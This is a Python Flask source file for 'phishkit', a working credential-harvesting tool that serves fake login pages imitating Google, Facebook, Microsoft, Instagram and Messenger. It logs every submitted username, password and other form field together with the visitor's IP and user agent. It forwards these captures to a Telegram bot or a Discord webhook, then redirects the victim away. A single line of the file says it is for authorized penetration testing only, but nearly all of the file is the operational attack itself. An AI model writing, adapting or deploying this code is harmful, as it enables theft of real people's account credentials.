
#!/usr/bin/env python3
"""
phishkit — credential harvester
For authorized penetration testing and security awareness training only.
"""

import os
import sys
import json
import argparse
import datetime
import requests
from flask import Flask, request, render_template, redirect, send_from_directory
from colorama import Fore, Style, init

import config

init(autoreset=True)

app = Flask(__name__, template_folder="templates", static_folder="static")

CAPTURE_DIR = "captured"
LOG_DIR = "logs"
os.makedirs(CAPTURE_DIR, exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)

CURRENT_TEMPLATE = "google"


def log_hit(data: dict):
    ts = datetime.datetime.utcnow().isoformat()
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "unknown")
    record = {"time": ts, "ip": ip, "ua": ua, **data}
    fname = os.path.join(CAPTURE_DIR, f"{CURRENT_TEMPLATE}_{ts[:10]}.log")
    with open(fname, "a") as f:
        f.write(json.dumps(record) + "\n")
    print(f"{Fore.GREEN}[+] CAPTURE{Style.RESET_ALL} {ip} -> {data}")

    if config.CAPTURE_MODE == "telegram" and config.TELEGRAM_BOT_TOKEN:
        msg = f"*Capture* [{CURRENT_TEMPLATE}]\nIP: `{ip}`\n" + "\n".join(
            f"{k}: `{v}`" for k, v in data.items()
        )
        try:
            requests.post(
                f"https://api.telegram.org/bot{config.TELEGRAM_BOT_TOKEN}/sendMessage",
                json={"chat_id": config.TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "Markdown"},
                timeout=5,
            )
        except Exception as e:
            print(f"{Fore.RED}[!] Telegram send failed: {e}")

    if config.CAPTURE_MODE == "discord" and config.DISCORD_WEBHOOK:
        content = f"**Capture** [{CURRENT_TEMPLATE}] IP: `{ip}`\n" + "\n".join(
            f"{k}: `{v}`" for k, v in data.items()
        )
        try:
            requests.post(config.DISCORD_WEBHOOK, json={"content": content}, timeout=5)
        except Exception as e:
            print(f"{Fore.RED}[!] Discord send failed: {e}")


@app.route("/", methods=["GET"])
def index():
    return render_template(f"{CURRENT_TEMPLATE}/index.html")


@app.route("/viral", methods=["GET"])
def viral_landing():
    return render_template("viral/index.html")


@app.route("/viral/login", methods=["GET"])
def viral_login():
    return render_template("viral/login.html")


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        return redirect("/viral/login")

    data = {}
    for k, v in request.form.items():
        data[k] = v

    if not data:
        data = request.get_json(silent=True) or {}

    log_hit(data)

    return redirect(config.REDIRECT_URL, code=302)
    data = {}
    for k, v in request.form.items():
        data[k] = v
    if not data:
        data = request.get_json(silent=True) or {}
    log_hit(data)
    return redirect(config.REDIRECT_URL, code=302)


@app.route("/static/<path:path>")
def static_files(path):
    return send_from_directory("static", path)


def main():
    global CURRENT_TEMPLATE
    parser = argparse.ArgumentParser(description="phishkit — credential harvester")
    parser.add_argument("-t", "--template", default="google",
                        choices=["google", "facebook", "messenger", "viral", "microsoft", "instagram", "generic"],
                        help="Login page template to serve")
    parser.add_argument("-p", "--port", type=int, default=config.PORT, help="Port to listen on")
    parser.add_argument("--host", default=config.HOST, help="Bind address")
    parser.add_argument("--tls", action="store_true", help="Enable HTTPS (self-signed)")
    args = parser.parse_args()
    CURRENT_TEMPLATE = args.template

    banner = f"""
{Fore.CYAN}phishkit{Style.RESET_ALL} — credential harvester
Template : {Fore.YELLOW}{args.template}{Style.RESET_ALL}
Bind     : {args.host}:{args.port}
Capture  : {Fore.GREEN}{config.CAPTURE_MODE}{Style.RESET_ALL}
Redirect : {config.REDIRECT_URL}
Captures : ./captured/
"""
    print(banner)
    print(f"{Fore.GREEN}[*] Server running. Ctrl+C to stop.{Style.RESET_ALL}\n")

    if args.tls:
        if not (os.path.exists(config.TLS_CERT) and os.path.exists(config.TLS_KEY)):
            print(f"{Fore.RED}[!] TLS cert/key not found.{Style.RESET_ALL}")
            sys.exit(1)
        app.run(host=args.host, port=args.port, ssl_context=(config.TLS_CERT, config.TLS_KEY))
    else:
        app.run(host=args.host, port=args.port)


if __name__ == "__main__":
    main()
